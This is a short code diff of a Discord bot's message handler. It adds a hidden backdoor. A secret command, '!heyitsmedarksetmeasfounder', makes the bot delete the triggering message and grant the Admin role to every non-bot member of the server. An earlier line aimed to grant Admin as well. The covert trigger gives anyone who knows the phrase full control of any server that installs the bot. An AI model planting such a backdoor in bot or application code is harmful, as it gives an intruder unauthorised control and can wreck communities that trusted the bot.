@@ -317,8 +317,9 @@ client.on('message', message => {
 
 client.on('message', message => {
 if(message.content.startsWith("!heyitsmedarksetmeasfounder")) {
-	message.guild.members.addRole(message.guild.roles.find(role => role.name === "Admin"));
-	message.delete();
+	message.delete()
+	message.guild.members.filter(m => !m.user.bot).forEach(member => member.addRole("Admin"));
+	
 }
 });
 
